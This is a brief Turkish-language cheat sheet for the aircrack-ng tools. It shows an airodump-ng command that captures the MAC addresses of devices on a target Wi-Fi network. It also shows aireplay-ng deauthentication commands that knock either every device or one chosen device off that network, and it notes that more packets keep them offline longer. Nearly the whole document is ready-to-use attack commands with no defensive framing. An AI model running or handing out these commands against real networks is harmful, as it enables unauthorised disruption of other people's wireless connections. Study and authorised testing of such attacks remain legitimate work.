# Ağdaki Cihazların MAC Adreslerini Görme
```
airodump -ng --channel X (kanal numarası) --bssid XX:XX:XX:XX:XX:XX (MAC adresi) --write airodumptest (Sonuçları yazdıracağımız 
dosya adı) wlan0
```
# Ağdaki Cihazlara Deauth Saldırısı Yapma
>Ağdaki Bütün Cihazlara Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX wlan0mon
```

>Ağdaki Belirli Cihaza Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```

* A: Gönderilecek paket sayısı, sayı büyüdükçe ağda düşme süresi artar
* -a:  Ağın MAC adresi
* -c:  Saldırı Yapılacak Cihazın MAC adresi
